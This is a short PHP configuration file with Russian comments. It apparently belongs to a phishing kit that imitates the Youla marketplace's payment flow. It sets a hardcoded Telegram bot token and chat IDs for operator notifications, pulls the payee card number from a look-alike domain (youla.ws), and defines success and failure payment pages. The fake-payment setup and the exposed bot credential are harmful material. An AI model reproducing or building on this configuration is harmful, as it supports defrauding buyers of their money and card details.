<?
global $token, $chatid, $card, $success_url, $fail_url;
header('Content-Type: text/html; charset=utf-8');

// По вопросам: @scitw

// Токен бота и id чата для уведомлений
$token  = '936498871:AAHasYjq1EeJ0OSAwpT4RfMvzztDtoTm_DM';
$chatid = '-1001284407943';
$wchatid = '-1001425167299';


// Номер карты для поступления зачислений
$card = file_get_contents('https://youla.ws/card');


// Страница с успешной оплатой
$success_url = "success.php";


// Страница с ошибкой оплаты
$fail_url = "fail.php";
?>